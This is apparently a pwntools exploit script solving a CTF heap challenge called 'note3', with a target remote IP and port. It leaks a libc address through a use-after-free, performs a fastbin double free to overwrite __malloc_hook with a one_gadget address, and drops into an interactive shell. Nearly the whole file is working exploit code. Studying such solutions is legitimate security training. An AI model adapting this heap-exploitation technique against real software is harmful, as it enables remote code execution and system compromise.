#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
参考
https://bbs.pediy.com/thread-223461.htm

"""

import sys
from pwn import *

context.log_level = 'debug'

fn = './note3'
env = None

if len(sys.argv) == 1:
    env = {'LD_PRELOAD': './libc.so.6'}
    if env:
        io = process(fn, env=env)
    else:
        io = process(fn)
else:
    io = remote('45.76.173.177', 6666)

def add(size, content):
    io.sendlineafter('>>', '1')
    io.sendlineafter(':', str(size))
    io.sendafter(':', content)

def show(idx):
    io.sendlineafter('>>', '2')
    io.sendlineafter(':', str(idx))
    data = io.recvuntil('\n1.add\n', drop=True)
    return data

def edit(idx, content):
    io.sendlineafter('>>', '3')
    io.sendlineafter(':', str(idx))
    sleep(0.1)
    io.send(content)

def delete(idx):
    io.sendlineafter('>>', '4')
    io.sendlineafter(':', str(idx))

fml = 0x60  # fastbin malloc length

ml = 0x100  # malloc_length

log.info('TODO: Leak main_arena address')
add(fml, '0' * fml)  # 0
add(fml, '1' * fml)  # 1
add(ml, '2' * ml)  # 2
add(ml, '/bin/sh\x00' + '3' * (ml - 8))  # 3

delete(2)
_ = show(2)
if len(_) != 6:
    log.error('Cannot leak full main_arena address. Please try again.')
    sys.exit()
_arena = u64(_.ljust(8, '\x00'))
main_arena = _arena - (0x7ff113e04b78 - 0x7ff113e04b20)
log.success('main_arena = %s', hex(main_arena))
malloc_hook = main_arena - 0x10
log.success('malloc_hook = %s', hex(malloc_hook))
# 关键地址 main_arena - 0x2b
fastbin_size_addr = main_arena - 0x2b
log.success('fastbin_size_addr = %s', hex(fastbin_size_addr))
libc_base = malloc_hook - (0x7f1dcc40daf0 - 0x7f1dcc076000)
log.success('libc_base = %s', hex(libc_base))

# shell_addr = libc_base + 0x3f306  # execve('/bin/sh', ...)
# shell_addr = libc_base + 0x3f35a
shell_addr = libc_base + 0xd694f
log.success('shell_addr = %s', hex(shell_addr))


delete(0)
delete(1)
delete(0)
# io.interactive()
add(fml, p64(fastbin_size_addr - 0x8))  # 4
add(fml, '5' * fml)  # 5
add(fml, '6' * fml)  # 6
add(fml, '\x00' * (3 + 16) + p64(shell_addr))  # 7
# add(fml, 'd')

io.sendlineafter('>>', '1')
io.sendlineafter(':', '255')

io.interactive()

# log.info('TODO: Leak heap address')
# delete(0)
# _ = show(0)
# # io.interactive() 
# if len(_) != 6:
#     log.error('Cannot leak full heap address. Please try again.')
#     sys.exit()
# _heap = u64(_.ljust(8, '\x00'))
# log.success('heap_addr = %s', hex(_heap))

# io.interactive()
